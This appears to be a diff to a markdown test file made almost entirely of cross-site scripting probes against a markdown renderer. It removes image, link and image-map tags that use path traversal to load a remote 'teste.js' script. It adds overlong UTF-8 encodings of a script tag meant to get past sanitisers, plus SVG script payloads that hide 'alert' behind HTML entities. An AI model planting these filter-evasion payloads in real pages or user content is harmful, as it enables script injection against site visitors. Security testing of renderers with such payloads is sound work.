@@ -1,6 +1,14 @@
 ![](../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js?w=10)
 
-<a href=# download="../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js">Test</a>
-<img referrerpolicy="no-referrer" src="../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js">
+<meta name="referrer" content="no-referrer">
 
-<img src="../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/12.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="../../../../../../../img/onload/../../r89shi/r89shi.github.io/blob/master/teste.js"></map>
+%C0%BCscript>alert(1)</script>
+%E0%80%BCscript>alert(1)</script>
+%F0%80%80%BCscript>alert(1)</script>
+%F8%80%80%80%BCscript>alert(1)</script>
+%FC%80%80%80%80%BCscript>alert(1)</script>
+
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
